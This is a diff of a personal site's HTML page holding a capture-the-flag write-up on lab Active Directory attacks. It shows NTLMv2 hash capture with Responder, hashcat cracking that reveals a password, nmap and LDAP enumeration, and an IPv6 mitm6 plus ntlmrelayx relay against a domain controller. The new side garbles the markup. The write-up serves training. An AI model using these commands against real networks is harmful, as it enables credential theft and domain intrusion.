@@ -260,7 +260,7 @@
   
   
   
-  <link rel="stylesheet" href="/css/wowchemy.8028d170b3ecf9438246932e1cbcdf6c.css" />
+  <link rel="stylesheet" href="/css/wowchemy.a5f2a0403faf5be0213f07cb8d40527c.css" />
 
   
 
@@ -281,8 +281,8 @@
     <link rel="manifest" href="/index.webmanifest" />
   
 
-  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
-  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
+  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_3.png" />
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_3.png" />
 
   <link rel="canonical" href="https://mohamed-elleuch.me/writeups/hacklockad/" />
 
@@ -341,7 +341,7 @@
   
   
   
-  <script src="/js/wowchemy-init.min.76abe0ff166961e9adc403995f18189f.js"></script>
+  <script src="/js/wowchemy-init.min.eca9bbc7a71accd5ebd9eee0ff004132.js"></script>
 
   
 
@@ -706,74 +706,117 @@ So basically we&rsquo;re going to provide our network interface to responder , a
 </code></pre>
 <p>And we wait until a user accidentally make a mistake while writing his hostname instead of providing a legitimate hostname in the DNS.
 And get his NTLMv2 hash.</p>
-<p><img class="special-img-class" src="Pasted image 20210220183501.png" /></p>
-<pre><code>Username:naruto
+<img class="special-img-class" src="Pasted image 20210220183501.png" />
+```
+Username:naruto
 Hash: naruto:::0099db0783fde495:F2C5BF32BD89C576A1E95A54D4BF7664:0101000000000000C0653150DE09D20121A6F48A2D912BFA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000B1EAB93D8ABDC394076EB8F8CA0CCF66489376BD473809472A94F666423EA3C20A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0030002E0036000000000000000000
-</code></pre>
+```
 <h2 id="p-stylecolorgreencracking-the-hash-p"><p style="color:Green">Cracking the HASH </p></h2>
 <p>We&rsquo;re going to use hashcat and rockyou wordlist to crack this hash,Basically we just need the Hash-Mod
 First of all, we&rsquo;re going to look for NTLMv2 Hash-Mod</p>
 <p><code>https://hashcat.net/wiki/doku.php?id=example_hashes</code></p>
-<p><img class="special-img-class" src="Pasted image 20210220184300.png" />
-Finally run hashcat,</p>
+<img class="special-img-class" src="Pasted image 20210220184300.png" />
+Finally run hashcat,
 <pre><code>hashcat.exe -m 5600 hash.txt rockyou.txt
 </code></pre>
-<p><img class="special-img-class" src="Pasted image 20210220184655.png" />
-And we wait until hashcat cracks it</p>
-<p><img class="special-img-class" src="Pasted image 20210220184750.png" /></p>
+<img class="special-img-class" src="Pasted image 20210220184655.png" />
+And we wait until hashcat cracks it
+<img class="special-img-class" src="Pasted image 20210220184750.png" />
+```
+<p>NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd</p>
 <pre><code>
-NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd 
+
+
+
+## &lt;p style=&quot;color:Green&quot;&gt;FLAG&lt;/p&gt;
 </code></pre>
-<h2 id="p-stylecolorgreenflagp"><p style="color:Green">FLAG</p></h2>
-<pre><code>Securinets{kelvinP@ssw0rd}
+<p>Securinets{kelvinP@ssw0rd}</p>
+<pre><code># &lt;p style=&quot;color:RED&quot;&gt;Task: IPv6 Attack &lt;/p&gt;
+##  &lt;p style=&quot;color:Green&quot;&gt;Preparing for the Attack  &lt;/p&gt;
+
+We're going to start with gathering informations about the network
+
 </code></pre>
-<h1 id="p-stylecolorredtask-ipv6-attack-p"><p style="color:RED">Task: IPv6 Attack </p></h1>
-<h2 id="p-stylecolorgreenpreparing-for-the-attack--p"><p style="color:Green">Preparing for the Attack  </p></h2>
-<p>We&rsquo;re going to start with gathering informations about the network</p>
-<pre><code>sudo ifconfig
+<p>sudo ifconfig</p>
+<pre><code>
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220182306.png&quot; /&gt;
+`Network address: 10.0.0.0/24`
+
+Let's now find the hosts IPs, It may take a while
+
 </code></pre>
-<p><img class="special-img-class" src="Pasted image 20210220182306.png" />
-<code>Network address: 10.0.0.0/24</code></p>
-<p>Let&rsquo;s now find the hosts IPs, It may take a while</p>
-<pre><code>nmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk '{print $6}' | uniq &gt; ips.txt 
+<p>nmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk &lsquo;{print $6}&rsquo; | uniq &gt; ips.txt</p>
+<pre><code>
+
+Now let's an nmap scan on the result
+
 </code></pre>
-<p>Now let&rsquo;s an nmap scan on the result</p>
-<pre><code>sudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A --open -oA nmap
+<p>sudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A &ndash;open -oA nmap</p>
+<pre><code>
+Or you can directly
+
 </code></pre>
-<p>Or you can directly</p>
-<pre><code>sudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap 
+<p>sudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap</p>
+<pre><code>
+
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220195053.png&quot; /&gt;
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220195212.png&quot; /&gt;
+After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller
+
+We can get the domain name either from the nmap results or by enumerating the ldap
+
 </code></pre>
-<p><img class="special-img-class" src="Pasted image 20210220195053.png" />
-<img class="special-img-class" src="Pasted image 20210220195212.png" />
-After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller</p>
-<p>We can get the domain name either from the nmap results or by enumerating the ldap</p>
-<pre><code>ldapsearch -h 10.0.0.7 -x -s base namingcontexts
+<p>ldapsearch -h 10.0.0.7 -x -s base namingcontexts</p>
+<pre><code>
+
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220194446.png&quot; /&gt;
+
 </code></pre>
-<p><img class="special-img-class" src="Pasted image 20210220194446.png" /></p>
-<pre><code>namingcontexts: DC=SECURINETS,DC=local
-// SECURINETS.local is the domain name
+<p>namingcontexts: DC=SECURINETS,DC=local
+// SECURINETS.local is the domain name</p>
+<pre><code>
+
+##  &lt;p style=&quot;color:Green&quot;&gt;Attacking  &lt;/p&gt;
+So basically we're going to  acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( https://github.com/fox-it/mitm6 ) which will act as IPv6 Router during the attack  and ntlmrelayx  ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.
+
+
+Let's start by setting up mitm6
+
 </code></pre>
-<h2 id="p-stylecolorgreenattacking--p"><p style="color:Green">Attacking  </p></h2>
-<p>So basically we&rsquo;re going to  acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( <a href="https://github.com/fox-it/mitm6">https://github.com/fox-it/mitm6</a> ) which will act as IPv6 Router during the attack  and ntlmrelayx  ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.</p>
-<p>Let&rsquo;s start by setting up mitm6</p>
-<pre><code>sudo mitm6 -d SECURINETS.local
+<p>sudo mitm6 -d SECURINETS.local</p>
+<pre><code>
+
+
+Let's now set up our ntlm relay
+
 </code></pre>
-<p>Let&rsquo;s now set up our ntlm relay</p>
-<pre><code>sudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t
+<p>sudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t</p>
+<pre><code>
+
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220200338.png&quot; /&gt;
+And wait until we get something juicy
+
+
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220200440.png&quot; /&gt;
+A folder l00t has been created which contains informations about the AD
+
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220200621.png&quot; /&gt;
+
+
+
+And we grab our flag
+
 </code></pre>
-<p><img class="special-img-class" src="Pasted image 20210220200338.png" />
-And wait until we get something juicy</p>
-<p><img class="special-img-class" src="Pasted image 20210220200440.png" />
-A folder l00t has been created which contains informations about the AD</p>
-<p><img class="special-img-class" src="Pasted image 20210220200621.png" /></p>
-<p>And we grab our flag</p>
-<pre><code>cat * | grep Securinets
+<p>cat * | grep Securinets</p>
+<pre><code>
+&lt;img class=&quot;special-img-class&quot; src=&quot;Pasted image 20210220201212.png&quot; /&gt;
+## &lt;p style=&quot;color:Green&quot;&gt; Flag  &lt;/p&gt;
 </code></pre>
-<p><img class="special-img-class" src="Pasted image 20210220201212.png" /></p>
-<h2 id="p-stylecolorgreen-flag--p"><p style="color:Green"> Flag  </p></h2>
-<pre><code>Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}
+<p>Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}</p>
+<pre><code>## Thanks for reading hope you enjoyed it!
+
+
 </code></pre>
-<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
 
     </div>
 
@@ -1161,7 +1204,7 @@ A folder l00t has been created which contains informations about the AD</p>
       
     
     
-    <script src="/en/js/wowchemy.min.a10ad2a6b25aea7a22d6392d483b454d.js"></script>
+    <script src="/en/js/wowchemy.min.e20609e6ad3f7fce339ee2e74f13682b.js"></script>
 
     
 
